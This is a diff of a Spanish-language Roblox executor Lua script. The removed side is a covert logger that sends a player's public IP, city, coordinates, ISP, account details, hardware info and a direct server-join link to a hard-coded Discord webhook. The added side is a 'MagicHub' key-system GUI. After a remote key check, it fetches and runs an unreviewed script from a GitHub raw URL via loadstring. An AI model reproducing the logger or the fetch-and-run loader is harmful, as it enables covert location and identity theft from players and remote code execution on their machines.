@@ -1,226 +1,321 @@
-local http = (syn and syn.request) or (http and http.request) or http_request or request
-local HttpService = game:GetService("HttpService")
+-- Roblox Executor - Key System Dinámico (MagicHub)
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
 local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-local Stats = game:GetService("Stats")
-local UserInputService = game:GetService("UserInputService")
-local LocalizationService = game:GetService("LocalizationService")
+local HttpService = game:GetService("HttpService")
 
--- Sustituye esto por la URL de tu webhook
-local webhookUrl = "https://discord.com/api/webhooks/1543610254938607757/abhK1z7eAhL2RICV9ezb1SN1BsPshkw6DqV45ayQA5pRfX_S8BUYA_Ykxvo4mK821yNQ"
+local LocalPlayer = Players.LocalPlayer
+local parentTarget = (gethui and gethui()) or CoreGui
 
-if not http then 
-    warn("Tu ejecutor no soporta funciones de peticiones HTTP.")
-    return 
+if parentTarget:FindFirstChild("MagicHub_KeySystem_v2") then
+	parentTarget.MagicHub_KeySystem_v2:Destroy()
 end
 
-local player = Players.LocalPlayer
-local userId = player.UserId
-local username = player.Name
-local displayName = player.DisplayName
-local accountAge = player.AccountAge
-local membershipType = player.MembershipType.Name
-local teamName = player.Team and player.Team.Name or "Sin Equipo"
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "MagicHub_KeySystem_v2"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = parentTarget
 
--- 1. APIS DE GEOLOCALIZACIÓN Y RED
-local ipData = { query = "N/A", country = "N/A", countryCode = "N/A", regionName = "N/A", city = "N/A", zip = "N/A", lat = "N/A", lon = "N/A", timezone = "N/A", isp = "N/A", org = "N/A", as = "N/A" }
-pcall(function()
-    local res = http({ Url = "http://ip-api.com/json/?fields=66846719", Method = "GET" })
-    if res and res.Body then
-        ipData = HttpService:JSONDecode(res.Body)
-    end
-end)
+-- Configuración de Enlaces
+local KEY_LINK = "https://magichub-go.lovable.app/"
+local JSON_KEYS_URL = "https://magichub-go.lovable.app/keysis.json"
 
--- 2. APIS PÚBLICAS DE ROBLOX
+-- Función para verificar la clave desde el JSON remoto
+local function verifyKeyOnline(userKey)
+	local success, response = pcall(function()
+		return game:HttpGet(JSON_KEYS_URL)
+	end)
 
--- Social (Amigos, Seguidores, Siguiendo)
-local friendsCount, followersCount, followingsCount = "0", "0", "0"
-pcall(function()
-    local res = http({ Url = "https://friends.roblox.com/v1/users/" .. userId .. "/friends/count", Method = "GET" })
-    if res and res.Body then friendsCount = tostring(HttpService:JSONDecode(res.Body).count) end
-end)
-pcall(function()
-    local res = http({ Url = "https://friends.roblox.com/v1/users/" .. userId .. "/followers/count", Method = "GET" })
-    if res and res.Body then followersCount = tostring(HttpService:JSONDecode(res.Body).count) end
-end)
-pcall(function()
-    local res = http({ Url = "https://friends.roblox.com/v1/users/" .. userId .. "/followings/count", Method = "GET" })
-    if res and res.Body then followingsCount = tostring(HttpService:JSONDecode(res.Body).count) end
-end)
+	if not success or not response then
+		return false, "Error de conexión al verificar la clave."
+	end
 
--- Grupos y Roles
-local groupsSummary = "Sin grupos"
-pcall(function()
-    local res = http({ Url = "https://groups.roblox.com/v1/users/" .. userId .. "/groups/roles", Method = "GET" })
-    if res and res.Body then
-        local data = HttpService:JSONDecode(res.Body).data
-        local groupList = {}
-        for i = 1, math.min(#data, 4) do
-            table.insert(groupList, "• " .. data[i].group.name .. " (`" .. data[i].role.name .. "`)")
-        end
-        if #groupList > 0 then groupsSummary = table.concat(groupList, "\n") end
-    end
-end)
+	local parseSuccess, data = pcall(function()
+		return HttpService:JSONDecode(response)
+	end)
 
--- Presence API (Estado en línea)
-local userPresence = "Desconocido"
-pcall(function()
-    local res = http({
-        Url = "https://presence.roblox.com/v1/presence/users",
-        Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body = HttpService:JSONEncode({ userIds = { userId } })
-    })
-    if res and res.Body then
-        local userState = HttpService:JSONDecode(res.Body).userPresences[1]
-        if userState then userPresence = userState.lastLocation end
-    end
-end)
+	if not parseSuccess or not data then
+		return false, "Error al procesar los datos del servidor."
+	end
 
--- Avatar API (Tipo de rig de avatar R6 / R15)
-local avatarType = "Desconocido"
-pcall(function()
-    local res = http({ Url = "https://avatar.roblox.com/v1/users/" .. userId .. "/avatar", Method = "GET" })
-    if res and res.Body then
-        avatarType = HttpService:JSONDecode(res.Body).playerAvatarType
-    end
-end)
+	-- Soporte si el JSON es una lista: ["KEY1", "KEY2"]
+	if type(data) == "table" then
+		for _, key in ipairs(data) do
+			if tostring(key) == userKey then
+				return true
+			end
+		end
+		-- Soporte si el JSON tiene clave directa: { "key": "VALOR" } o { "keys": [...] }
+		if data.key and tostring(data.key) == userKey then
+			return true
+		elseif type(data.keys) == "table" then
+			for _, key in ipairs(data.keys) do
+				if tostring(key) == userKey then
+					return true
+				end
+			end
+		end
+	end
 
--- Badges API (Insignias del usuario en la experiencia)
-local badgeCount = "0"
-pcall(function()
-    local res = http({ Url = "https://badges.roblox.com/v1/users/" .. userId .. "/badges?limit=10", Method = "GET" })
-    if res and res.Body then
-        local data = HttpService:JSONDecode(res.Body).data
-        badgeCount = tostring(#data)
-    end
-end)
-
--- 3. RENDIMIENTO Y HARDWARE
-local totalRamMB = math.floor(Stats:GetTotalMemoryUsageMb())
-local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
-local fps = math.floor(workspace:GetRealPhysicsFPS())
-
-local viewportSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(0,0)
-local resolutionStr = math.floor(viewportSize.X) .. "x" .. math.floor(viewportSize.Y)
-
-local platform = "PC / Laptop"
-if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-    platform = "Móvil / Tablet"
-elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
-    platform = "Consola"
+	return false, "Clave incorrecta. Inténtalo de nuevo."
 end
 
--- 4. JUEGO Y SERVIDOR
-local placeId = game.PlaceId
-local gameId = game.GameId
-local jobId = game.JobId
-local serverSize = #Players:GetPlayers() .. " / " .. Players.MaxPlayers
+-- 2. Notificación Superior Central Flotante
+local topNotification = Instance.new("Frame")
+topNotification.Name = "TopNotification"
+topNotification.Size = UDim2.new(0, 280, 0, 38)
+topNotification.Position = UDim2.new(0.5, -140, 0, -50)
+topNotification.BackgroundColor3 = Color3.fromRGB(22, 24, 30)
+topNotification.BorderSizePixel = 0
+topNotification.Parent = screenGui
 
-local gameName, creatorName, creatorId = "Desconocido", "Desconocido", "0"
-pcall(function()
-    local productInfo = MarketplaceService:GetProductInfo(placeId)
-    gameName = productInfo.Name
-    creatorName = productInfo.Creator.Name
-    creatorId = tostring(productInfo.Creator.CreatorTargetId)
+local notifCorner = Instance.new("UICorner")
+notifCorner.CornerRadius = UDim.new(0, 8)
+notifCorner.Parent = topNotification
+
+local notifStroke = Instance.new("UIStroke")
+notifStroke.Color = Color3.fromRGB(0, 122, 255)
+notifStroke.Thickness = 1
+notifStroke.Parent = topNotification
+
+local notifText = Instance.new("TextLabel")
+notifText.Size = UDim2.new(1, 0, 1, 0)
+notifText.BackgroundTransparency = 1
+notifText.Text = ""
+notifText.TextColor3 = Color3.fromRGB(240, 240, 245)
+notifText.Font = Enum.Font.GothamMedium
+notifText.TextSize = 12
+notifText.Parent = topNotification
+
+local function showNotification(text, color, strokeColor)
+	notifText.Text = text
+	notifText.TextColor3 = color or Color3.fromRGB(240, 240, 245)
+	notifStroke.Color = strokeColor or Color3.fromRGB(0, 122, 255)
+	
+	topNotification:TweenPosition(
+		UDim2.new(0.5, -140, 0, 18),
+		Enum.EasingDirection.Out,
+		Enum.EasingStyle.Quart,
+		0.3,
+		true
+	)
+	
+	task.delay(3, function()
+		topNotification:TweenPosition(
+			UDim2.new(0.5, -140, 0, -50),
+			Enum.EasingDirection.In,
+			Enum.EasingStyle.Quart,
+			0.3,
+			true
+		)
+	end)
+end
+
+-- 3. Ventana Principal
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 360, 0, 150)
+mainFrame.Position = UDim2.new(0.5, -180, 0.5, -75)
+mainFrame.BackgroundColor3 = Color3.fromRGB(18, 19, 23)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.ClipsDescendants = true
+mainFrame.Parent = screenGui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 12)
+mainCorner.Parent = mainFrame
+
+local mainStroke = Instance.new("UIStroke")
+mainStroke.Color = Color3.fromRGB(40, 42, 50)
+mainStroke.Thickness = 1
+mainStroke.Parent = mainFrame
+
+-- 4. Header de Usuario + Título
+local userHeader = Instance.new("Frame")
+userHeader.Name = "UserHeader"
+userHeader.Size = UDim2.new(1, -24, 0, 40)
+userHeader.Position = UDim2.new(0, 12, 0, 10)
+userHeader.BackgroundTransparency = 1
+userHeader.Parent = mainFrame
+
+local avatarImage = Instance.new("ImageLabel")
+avatarImage.Name = "AvatarImage"
+avatarImage.Size = UDim2.new(0, 38, 0, 38)
+avatarImage.Position = UDim2.new(0, 0, 0, 1)
+avatarImage.BackgroundColor3 = Color3.fromRGB(28, 30, 36)
+avatarImage.BorderSizePixel = 0
+avatarImage.Parent = userHeader
+
+task.spawn(function()
+	if LocalPlayer then
+		local content, isReady = Players:GetUserThumbnailAsync(
+			LocalPlayer.UserId,
+			Enum.ThumbnailType.HeadShot,
+			Enum.ThumbnailSize.Size100x100
+		)
+		if isReady then
+			avatarImage.Image = content
+		end
+	end
 end)
 
--- Recopilación de Enlaces
-local profileLink = "https://www.roblox.com/users/" .. userId .. "/profile"
-local gameLink = "https://www.roblox.com/games/" .. placeId
-local serverLink = "https://www.roblox.com/games/" .. placeId .. "?jobId=" .. jobId
-local avatarImageUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+local avatarCorner = Instance.new("UICorner")
+avatarCorner.CornerRadius = UDim.new(1, 0)
+avatarCorner.Parent = avatarImage
 
-local executorName = identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "Desconocido"
+local displayNameLabel = Instance.new("TextLabel")
+displayNameLabel.Name = "DisplayName"
+displayNameLabel.Size = UDim2.new(0, 140, 0, 18)
+displayNameLabel.Position = UDim2.new(0, 46, 0, 2)
+displayNameLabel.BackgroundTransparency = 1
+displayNameLabel.Text = LocalPlayer and LocalPlayer.DisplayName or "miau123CALVO"
+displayNameLabel.TextColor3 = Color3.fromRGB(240, 240, 245)
+displayNameLabel.Font = Enum.Font.GothamBold
+displayNameLabel.TextSize = 14
+displayNameLabel.TextXAlignment = Enum.TextXAlignment.Left
+displayNameLabel.Parent = userHeader
 
--- CONSTRUCCIÓN DEL EMBED DE DISCORD
-local payload = {
-    embeds = {
-        {
-            title = "🌐 **Informe Avanzado de Cuenta y Sistema**",
-            color = 3447003,
-            fields = {
-                {
-                    name = "👤 **Perfil y Cuenta (Roblox API)**",
-                    value = "• **Usuario:** [" .. displayName .. " (@" .. username .. ")](" .. profileLink .. ")\n" ..
-                            "• **User ID:** `" .. tostring(userId) .. "`\n" ..
-                            "• **Edad de Cuenta:** " .. tostring(accountAge) .. " días\n" ..
-                            "• **Membresía:** " .. membershipType .. "\n" ..
-                            "• **Avatar Rig:** " .. avatarType .. "\n" ..
-                            "• **Equipo:** " .. teamName,
-                    inline = false
-                },
-                {
-                    name = "👥 **Estadísticas Sociales (Social API)**",
-                    value = "• **Amigos:** " .. friendsCount .. "\n" ..
-                            "• **Seguidores:** " .. followersCount .. "\n" ..
-                            "• **Siguiendo:** " .. followingsCount .. "\n" ..
-                            "• **Ubicación en Plataforma:** " .. userPresence,
-                    inline = true
-                },
-                {
-                    name = "🏆 **Insignias Recientes**",
-                    value = "• **Badges Obtenidas:** " .. badgeCount,
-                    inline = true
-                },
-                {
-                    name = "🛡️ **Grupos (Groups API)**",
-                    value = groupsSummary,
-                    inline = false
-                },
-                {
-                    name = "📍 **Geolocalización y Red (ip-api)**",
-                    value = "• **IP Pública:** `" .. tostring(ipData.query) .. "`\n" ..
-                            "• **País:** " .. tostring(ipData.country) .. " (" .. tostring(ipData.countryCode) .. ")\n" ..
-                            "• **Ciudad/Región:** " .. tostring(ipData.city) .. ", " .. tostring(ipData.regionName) .. "\n" ..
-                            "• **Coordenadas:** `" .. tostring(ipData.lat) .. ", " .. tostring(ipData.lon) .. "`\n" ..
-                            "• **ISP / ASN:** " .. tostring(ipData.isp) .. " (" .. tostring(ipData.as) .. ")\n" ..
-                            "• **Zona Horaria:** " .. tostring(ipData.timezone),
-                    inline = false
-                },
-                {
-                    name = "💻 **Hardware y Cliente**",
-                    value = "• **Ejecutor:** `" .. executorName .. "`\n" ..
-                            "• **Plataforma:** " .. platform .. "\n" ..
-                            "• **Resolución:** `" .. resolutionStr .. "`\n" ..
-                            "• **Memoria Asignada:** `" .. tostring(totalRamMB) .. " MB`\n" ..
-                            "• **Rendimiento:** " .. tostring(fps) .. " FPS | " .. tostring(ping) .. " ms\n" ..
-                            "• **Idioma:** " .. LocalizationService.RobloxLocaleId,
-                    inline = false
-                },
-                {
-                    name = "🎮 **Juego y Servidor**",
-                    value = "• **Nombre:** [" .. gameName .. "](" .. gameLink .. ")\n" ..
-                            "• **Creador:** " .. creatorName .. " (ID: `" .. creatorId .. "`)\n" ..
-                            "• **Place ID:** `" .. tostring(placeId) .. "` | **Game ID:** `" .. tostring(gameId) .. "`\n" ..
-                            "• **Jugadores:** " .. serverSize .. "\n" ..
-                            "• **Enlace Servidor:** [Unirse al Servidor Directamente](" .. serverLink .. ")",
-                    inline = false
-                }
-            },
-            image = {
-                url = avatarImageUrl
-            },
-            footer = {
-                text = "Registro mediante APIs externas"
-            },
-            timestamp = DateTime.now():ToIsoDate()
-        }
-    }
-}
+local usernameLabel = Instance.new("TextLabel")
+usernameLabel.Name = "Username"
+usernameLabel.Size = UDim2.new(0, 140, 0, 14)
+usernameLabel.Position = UDim2.new(0, 46, 0, 20)
+usernameLabel.BackgroundTransparency = 1
+usernameLabel.Text = "@" .. (LocalPlayer and LocalPlayer.Name or "miau123CALVO")
+usernameLabel.TextColor3 = Color3.fromRGB(120, 122, 135)
+usernameLabel.Font = Enum.Font.Gotham
+usernameLabel.TextSize = 11
+usernameLabel.TextXAlignment = Enum.TextXAlignment.Left
+usernameLabel.Parent = userHeader
 
--- PETICIÓN POST AL WEBHOOK DE DISCORD
-local response = http({
-    Url = webhookUrl,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = HttpService:JSONEncode(payload)
-})
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Name = "TitleLabel"
+titleLabel.Size = UDim2.new(0, 140, 0, 20)
+titleLabel.Position = UDim2.new(0, 190, 0, 12)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "MagicHub · Key System"
+titleLabel.TextColor3 = Color3.fromRGB(140, 145, 160)
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextSize = 12
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+titleLabel.Parent = userHeader
 
-if response.StatusCode == 200 or response.StatusCode == 204 then
-    print("Información completa enviada al webhook.")
-else
-    warn("Error al enviar el webhook. Código HTTP: " .. tostring(response.StatusCode))
-end
+-- 5. Campo de Texto (Input Key)
+local keyInput = Instance.new("TextBox")
+keyInput.Name = "KeyInput"
+keyInput.Size = UDim2.new(1, -24, 0, 38)
+keyInput.Position = UDim2.new(0, 12, 0, 56)
+keyInput.BackgroundColor3 = Color3.fromRGB(25, 27, 32)
+keyInput.BorderSizePixel = 0
+keyInput.PlaceholderText = "Pega tu clave aquí..."
+keyInput.PlaceholderColor3 = Color3.fromRGB(90, 92, 105)
+keyInput.Text = ""
+keyInput.TextColor3 = Color3.fromRGB(240, 240, 245)
+keyInput.Font = Enum.Font.GothamMedium
+keyInput.TextSize = 13
+keyInput.ClearTextOnFocus = false
+keyInput.Parent = mainFrame
+
+local inputCorner = Instance.new("UICorner")
+inputCorner.CornerRadius = UDim.new(0, 8)
+inputCorner.Parent = keyInput
+
+-- 6. Botones
+local getKeyBtn = Instance.new("TextButton")
+getKeyBtn.Name = "GetKeyButton"
+getKeyBtn.Size = UDim2.new(0.5, -16, 0, 38)
+getKeyBtn.Position = UDim2.new(0, 12, 0, 100)
+getKeyBtn.BackgroundColor3 = Color3.fromRGB(28, 30, 36)
+getKeyBtn.BorderSizePixel = 0
+getKeyBtn.Text = "Get Key"
+getKeyBtn.TextColor3 = Color3.fromRGB(200, 205, 215)
+getKeyBtn.Font = Enum.Font.GothamBold
+getKeyBtn.TextSize = 12
+getKeyBtn.AutoButtonColor = false
+getKeyBtn.Parent = mainFrame
+
+local getKeyCorner = Instance.new("UICorner")
+getKeyCorner.CornerRadius = UDim.new(0, 8)
+getKeyCorner.Parent = getKeyBtn
+
+local submitBtn = Instance.new("TextButton")
+submitBtn.Name = "SubmitButton"
+submitBtn.Size = UDim2.new(0.5, -16, 0, 38)
+submitBtn.Position = UDim2.new(0.5, 4, 0, 100)
+submitBtn.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
+submitBtn.BorderSizePixel = 0
+submitBtn.Text = "Continuar"
+submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+submitBtn.Font = Enum.Font.GothamBold
+submitBtn.TextSize = 12
+submitBtn.AutoButtonColor = false
+submitBtn.Parent = mainFrame
+
+local submitCorner = Instance.new("UICorner")
+submitCorner.CornerRadius = UDim.new(0, 8)
+submitCorner.Parent = submitBtn
+
+-- ACCIONES DE BOTONES
+
+-- Get Key: Copia el enlace directo de obtención de key
+getKeyBtn.MouseButton1Click:Connect(function()
+	if setclipboard then
+		setclipboard(KEY_LINK)
+		showNotification("¡Enlace copiado al portapapeles!", Color3.fromRGB(100, 220, 130), Color3.fromRGB(100, 220, 130))
+	else
+		showNotification("Link: " .. KEY_LINK, Color3.fromRGB(255, 180, 60), Color3.fromRGB(255, 180, 60))
+	end
+end)
+
+-- Continuar: Verifica la clave con el JSON remoto
+submitBtn.MouseButton1Click:Connect(function()
+	local userEnteredKey = keyInput.Text:gsub("%s+", "")
+	
+	if userEnteredKey == "" then
+		showNotification("Por favor, introduce una clave.", Color3.fromRGB(255, 180, 60), Color3.fromRGB(255, 180, 60))
+		return
+	end
+	
+	showNotification("Verificando clave...", Color3.fromRGB(140, 145, 160), Color3.fromRGB(140, 145, 160))
+
+	task.spawn(function()
+		local isValid, message = verifyKeyOnline(userEnteredKey)
+		
+		if isValid then
+			showNotification("Acceso concedido. Cargando...", Color3.fromRGB(100, 220, 130), Color3.fromRGB(100, 220, 130))
+			
+			task.wait(0.4)
+			
+			local exitTween = TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+				Position = UDim2.new(0.5, -180, 0.5, -50),
+				BackgroundTransparency = 1
+			})
+			
+			exitTween:Play()
+			exitTween.Completed:Connect(function()
+				screenGui:Destroy()
+				
+				local success, err = pcall(function()
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/alex2013palomo-byte/luamaser/main/masterlua.raw"))()
+				end)
+				
+				if not success then
+					warn("Error al cargar el script:", err)
+				end
+			end)
+		else
+			showNotification(message or "Clave incorrecta. Inténtalo de nuevo.", Color3.fromRGB(255, 90, 90), Color3.fromRGB(255, 90, 90))
+			
+			local origPos = UDim2.new(0.5, -180, 0.5, -75)
+			for i = 1, 3 do
+				mainFrame.Position = origPos + UDim2.new(0, -4, 0, 0)
+				task.wait(0.04)
+				mainFrame.Position = origPos + UDim2.new(0, 4, 0, 0)
+				task.wait(0.04)
+			end
+			mainFrame.Position = origPos
+		end
+	end)
+end)
